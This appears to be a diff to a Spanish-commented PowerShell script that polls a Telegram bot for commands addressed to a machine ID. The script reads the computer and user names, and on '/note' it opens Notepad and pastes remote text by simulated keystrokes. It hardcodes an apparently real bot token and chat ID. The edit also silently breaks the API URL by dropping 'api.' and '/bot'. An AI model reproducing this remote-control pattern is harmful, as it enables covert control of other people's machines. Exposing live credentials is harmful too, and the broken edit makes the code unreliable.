@@ -5,7 +5,7 @@ $Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TO
 $ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO
 
 # Construcción de URL fija ultra-estable que acabamos de validar
-$URL    = "https://api.telegram.org/bot" + $Token
+$URL    = "https://telegram.org" + $Token
 $MiPC   = $env:COMPUTERNAME
 $User   = $env:USERNAME
 
@@ -53,11 +53,10 @@ while ($true) {
                 # 1. Separar el texto por espacios de forma estricta
                 $Partes = $TextoRecibido -split " "
                 
-                # OBLIGATORIO: Extraer solo la primera palabra (El comando) usando [0]
+                # FIX: Se restauraron los índices fijos indispensables para separar el texto
                 $Comando = [string]$Partes[0]
                 $Comando = $Comando.ToLower()
                 
-                # OBLIGATORIO: Extraer la segunda palabra (El ID de la PC) usando [1]
                 $IDDestino = ""
                 if ($Partes.Count -gt 1) {
                     $IDDestino = [string]$Partes[1]
@@ -123,14 +122,14 @@ while ($true) {
                         }
 
                         "/note" {
-                            # Junta todas las palabras que vienen después del comando y del ID
+                            # Junta todas las palabras desde la posición 2 en adelante
                             $MensajePersonalizado = ($Partes[2..($Partes.Count - 1)]) -join " "
 
                             if ($null -ne $MensajePersonalizado -and $MensajePersonalizado -trim() -ne "") {
                                 Start-Process "notepad.exe"
                                 Start-Sleep -Milliseconds 500
                                 
-                                # Copiar y pegar evita que se pierdan letras al tipear textos largos
+                                # Copiar y pegar de forma limpia
                                 Set-Clipboard -Value $MensajePersonalizado
                                 $wsh = New-Object -ComObject WScript.Shell
                                 $wsh.SendKeys("^v")
@@ -140,11 +139,11 @@ while ($true) {
                             }
                             continue
                         }
-                    } # 👈 AQUÍ CIERRA EL SWITCH
-                } # 👈 AQUÍ CIERRA EL IF DE VALIDACIÓN DE ID
-            } # 👈 AQUÍ CIERRA EL IF DE REMITENTE Y TEXTO
-        } # 👈 AQUÍ CIERRA EL FOREACH DE UPDATES
+                    } # Cierre del switch
+                } # Cierre del if de VALIDACIÓN DE ID
+            } # Cierre del if de REMITENTE
+        } # Cierre del foreach
     } catch {
         Start-Sleep -Seconds 2
-    } # 👈 AQUÍ CIERRA EL CATCH DEL BUCLE PRINCIPAL
-} # 👈 AQUÍ CIERRA EL WHILE
+    } # Cierre del catch
+} # Cierre del while
